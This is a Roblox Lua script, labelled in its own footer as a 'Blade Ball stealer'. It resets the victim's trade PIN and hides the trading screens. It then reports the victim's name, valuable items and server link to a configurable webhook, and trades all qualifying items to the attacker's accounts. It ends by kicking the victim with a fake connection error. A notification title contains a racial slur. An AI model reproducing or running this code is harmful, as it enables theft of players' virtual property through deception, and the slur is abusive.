_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Récupération des variables globales
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Compatibilité de la fonction de requête (Fix pour les exécuteurs)
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

if not httpRequest then
    plr:kick("Executor non supporté (manque http_request)")
    return
end

-- Sécurité de base
if next(users) == nil or webhook == "" then
    plr:kick("Configuration manquante")
    return
end

-- Bypass PIN
local args = {[1] = {["option"] = "PIN", ["value"] = "9079"}}
pcall(function() netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args)) end)

-- Masquage UI
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
tradeGui.Main.Visible = false

-- Formatage nombres
local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- FONCTION D'ENVOI UNIQUE
local function PostToCloudflare(data)
    data["auth_token"] = auth_token -- On s'assure que le token est présent
    local success, res = pcall(function()
        return httpRequest({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    return success
end

local function GetSortedFields(list, isFinal)
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local text = ""
    for _, group in ipairs(groupedList) do
        text = text .. string.format("⭐ %s (x%s) - %s\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end
    return text
end

local function SendJoinMessage(list, prefix)
    local itemText = GetSortedFields(list)
    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "Victim:", value = plr.Name, inline = true},
                {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
                {name = "Items:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
                {name = "Total:", value = formatNumber(totalRAP)}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    PostToCloudflare(data)
end

local function SendFinalMessage(list)
    local itemText = GetSortedFields(list)
    local data = {
        ["embeds"] = {{
            ["title"] = "✅ Items Sent Successfully!",
            ["color"] = 65280,
            ["fields"] = {
                {name = "Victim:", value = plr.Name, inline = true},
                {name = "Items Sent:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
                {name = "Total RAP:", value = formatNumber(totalRAP)}
            }
        }}
    }
    PostToCloudflare(data)
end

-- Calcul RAP
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
for _, cat in ipairs(categories) do
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = 0
            local catData = rapData[cat]
            if catData then
                for k, v in pairs(catData) do
                    if string.find(k, info.Name) then rap = v break end
                end
            end
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- Lancement Trade
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
    local copy = {unpack(itemsToSend)}
    SendJoinMessage(itemsToSend, (ping == "Yes" and "@everyone " or ""))

    local function doTrade(target)
        while #itemsToSend > 0 do
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(game.Players:WaitForChild(target))
            repeat task.wait(0.5) until tradeGui.Enabled
            inTrade = true
            
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                count = count + 1
            end
            
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.2) until not tradeGui.Enabled
            inTrade = false
        end
        plr:kick("Connection Error (277)")
    end

    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then
            SendFinalMessage(copy)
            doTrade(p.Name)
            break
        end
    end
end
